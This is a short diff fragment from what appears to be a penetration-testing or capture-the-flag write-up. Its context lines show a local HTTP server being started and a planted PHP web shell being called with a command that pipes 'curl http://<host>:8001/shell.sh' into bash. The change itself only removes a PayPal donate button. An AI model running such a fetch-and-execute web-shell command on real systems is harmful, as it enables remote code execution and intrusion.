@@ -2753,9 +2753,3 @@ python -m http.server 8001
 ```
 
 Going to: `http://<host1>/exports/top_players_a3pitdu4.php?cmd=curl%20http://<host>:8001/shell.sh%20|%20bash`
-
----
-
-<a href="https://www.paypal.com/donate/?hosted_button_id=GWWLEXEF3XL92">
-  <img src="https://raw.githubusercontent.com/kraloveckey/kraloveckey/refs/heads/main/.assets/paypal-donate-button.png" alt="Donate with PayPal" width="225" height="100"/>
-</a>
